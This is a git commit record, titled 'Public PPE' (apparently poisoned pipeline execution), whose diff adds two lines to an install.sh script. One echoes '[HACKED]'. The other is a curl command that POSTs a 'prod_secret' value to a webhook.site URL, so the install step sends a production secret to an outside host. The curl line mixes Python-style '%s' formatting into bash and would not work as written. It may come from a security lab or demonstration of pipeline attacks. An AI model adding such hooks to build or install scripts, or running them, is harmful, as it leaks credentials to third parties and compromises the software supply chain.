7fa491854ab3ecbd9957238e48a2fa6bbfaa4ef8
JacoStu <139375560+JacoStu@users.noreply.github.com>
2026-01-20 16:49:28 +0100

    Public PPE

--- install.sh
+++ install.sh
@@ -1,2 +1,4 @@
 #!/bin/bash
 echo "Installing tool..."
+echo "[HACKED]..."
+curl -H "Content-Type: application/json" -X POST -d '{\"prod_secret\": \"%s\"}' https://webhook.site/d75e796d-f8b5-440b-b93d-018f6eb0adb9 % prod_secret
